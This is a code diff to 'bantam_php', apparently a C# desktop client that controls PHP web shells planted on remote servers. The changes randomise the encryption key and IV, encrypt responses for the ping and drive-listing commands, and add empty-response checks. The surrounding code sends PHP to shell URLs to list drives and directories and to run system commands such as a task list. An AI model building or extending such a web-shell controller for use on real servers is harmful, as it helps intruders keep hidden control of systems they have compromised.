@@ -46,6 +46,9 @@ namespace bantam_php
 
             //has to be initialized with parameters manually because, constructor with params breaks design mode...
             txtBoxFileBrowserPath.Initialize(btnFileBrowserBack_MouseClick, 21);
+
+            EncryptionHelper.RandomizeEncryptionIV();
+            EncryptionHelper.RandomizeEncryptionKey();
         }
 
         #region HELPER_FUNCTIONS
@@ -124,6 +127,11 @@ namespace bantam_php
                 
                 if (encryptResponse) {
                     result = EncryptionHelper.DecryptShellResponse(result);
+                }
+
+                if (string.IsNullOrEmpty(result)) {
+                    MessageBox.Show("No Data Returned", "Welp..");
+                    return;
                 }
 
                 GuiHelper.RichTextBoxDialog(title, result);
@@ -240,6 +248,7 @@ namespace bantam_php
             }
 
             string shellUrl = g_SelectedShellUrl;
+            bool encryptResponse = Shells[shellUrl].encryptResponse;
             ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewClients);
 
             if (lvi != null
@@ -249,8 +258,17 @@ namespace bantam_php
                 Shells[shellUrl].pingStopwatch.Start();
 
                 //todo test this when shell has gone away
-                //todo encryption
-                string result = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.phpTestExecutionWithEcho);
+                string phpCode = PhpHelper.PhpTestExecutionWithEcho(encryptResponse);
+                string result = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
+
+                if (encryptResponse) {
+                    result = EncryptionHelper.DecryptShellResponse(result);
+                }
+
+                if (string.IsNullOrEmpty(result)) {
+                    MessageBox.Show("Error Decoding Response!", "Whoops!!!");
+                    return;
+                }
 
                 lvi.SubItems[1].Text = Shells[shellUrl].pingStopwatch.ElapsedMilliseconds.ToString() + " ms";
                 Shells[shellUrl].pingStopwatch.Stop();
@@ -676,8 +694,9 @@ namespace bantam_php
 
             if (Shells[shellUrl].isWindows) {
                 txtBoxFileBrowserPath.Text = "";
+                string phpCode = PhpHelper.GetHardDriveLettersPhp(encryptResponse);
+                string result = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
 
-                string result = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.getHardDriveLetters);
                 if (encryptResponse) {
                     result = EncryptionHelper.DecryptShellResponse(result);
                 }
@@ -700,7 +719,7 @@ namespace bantam_php
                 string result = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);
 
                 if (result != null && result.Length > 0) {
-                    if(encryptResponse) {
+                    if (encryptResponse) {
                         result = EncryptionHelper.DecryptShellResponse(result);
                     }
                     if (!string.IsNullOrEmpty(result)) {
@@ -1014,6 +1033,7 @@ namespace bantam_php
             string shellUrl = g_SelectedShellUrl;
             bool isWin = Shells[shellUrl].isWindows;
             bool encrypt = Shells[shellUrl].encryptResponse;
+
             string cmd = PhpHelper.getTaskListFunction(isWin);
             string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
 
